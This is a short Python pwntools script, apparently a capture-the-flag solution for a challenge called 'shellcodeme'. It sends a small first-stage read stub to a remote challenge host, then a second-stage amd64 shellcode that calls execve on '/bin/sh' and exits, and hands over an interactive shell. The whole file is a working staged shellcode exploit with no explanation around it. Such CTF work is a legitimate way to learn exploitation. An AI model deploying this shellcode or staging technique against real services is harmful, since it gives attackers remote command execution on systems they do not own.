from pwn import *

context.arch = "amd64"

sh = asm("""
pop rdx
pop rax
pop rax
pop rdi
syscall
call rsi
""")




payload =asm("""
mov rbx,0x0068732f6e69622f
push rbx
push rsp
pop rdi
xor rsi,rsi
push rsi
pop rdx
push rdx
pop rax
mov al,0x3b
syscall
mov al,0x3c
xor rdi,rdi
syscall
""")


r = remote("shellcodeme.420blaze.in", 420)
#r = process(["./shellcodeme"])

#input()

r.sendline(sh)

r.send(payload)

r.interactive()
